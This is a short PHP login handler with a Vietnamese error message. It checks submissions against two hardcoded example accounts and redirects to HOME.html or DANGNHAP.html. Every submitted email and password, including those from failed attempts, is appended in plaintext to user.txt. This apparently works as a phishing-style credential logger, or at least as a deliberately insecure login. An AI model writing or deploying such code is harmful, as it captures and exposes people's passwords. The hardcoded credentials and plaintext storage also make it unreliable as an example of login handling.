<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    $defaultAccounts = [
        ["email" => "user@example.com", "password" => "password123"],
        ["email" => "admin@example.com", "password" => "admin456"]
    ];

    $file = 'user.txt';
    $isLoginSuccessful = false;
    foreach ($defaultAccounts as $account) {
        if ($email === $account['email'] && $password === $account['password']) {
            $isLoginSuccessful = true;
            break;
        }
    }

    if ($isLoginSuccessful) {
        $content = "SUCCESS LOGIN - Email: $email\nPassword: $password\n\n";
        file_put_contents($file, $content, FILE_APPEND);
        header("Location: ./HOME.html");
        exit();
    } else {
        $content = "FAILED LOGIN - Email: $email\nPassword: $password\n\n";
        file_put_contents($file, $content, FILE_APPEND);
        $error = "Sai email hoặc mật khẩu!";
        header("Location: ./DANGNHAP.html?error=" . urlencode($error));
        exit();
    }
}
